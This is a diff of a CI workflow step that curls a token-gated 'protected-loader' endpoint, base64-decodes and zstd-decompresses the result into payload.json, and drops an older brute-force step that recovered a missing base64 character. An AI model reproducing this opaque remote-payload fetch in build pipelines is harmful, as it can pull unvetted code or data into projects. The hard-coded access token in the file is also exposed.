@@ -16,27 +16,13 @@ jobs:
         run: |
           set -euo pipefail
           base='https://aconptuqupsgznyrxhrh.supabase.co/functions/v1/project-library-protected-loader?token=mettelo-stage-bridge-199'
-          curl --fail --silent --show-error --max-time 60 "${base}&mode=payload" -o payload.b64
+          curl --fail --silent --show-error --max-time 60 "${base}&mode=parts" -o payload.b64
           python - <<'PY'
-          import base64, subprocess
+          import base64
           from pathlib import Path
           s=Path('payload.b64').read_text().strip()
-          alphabet='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-          found=None
-          for c in alphabet:
-              try:
-                  raw=base64.b64decode(s+c+'===')
-              except Exception:
-                  continue
-              Path('candidate.zst').write_bytes(raw)
-              p=subprocess.run(['zstd','-q','-t','candidate.zst'])
-              if p.returncode==0:
-                  found=c
-                  Path('payload.zst').write_bytes(raw)
-                  break
-          if found is None:
-              raise SystemExit('Unable to recover missing final base64 character')
-          print({'encoded_chars':len(s),'recovered_char':found,'compressed_bytes':Path('payload.zst').stat().st_size})
+          Path('payload.zst').write_bytes(base64.b64decode(s+'==='))
+          print({'encoded_chars':len(s),'compressed_bytes':Path('payload.zst').stat().st_size})
           PY
           zstd -q -d payload.zst -o payload.json
           python - <<'PY'
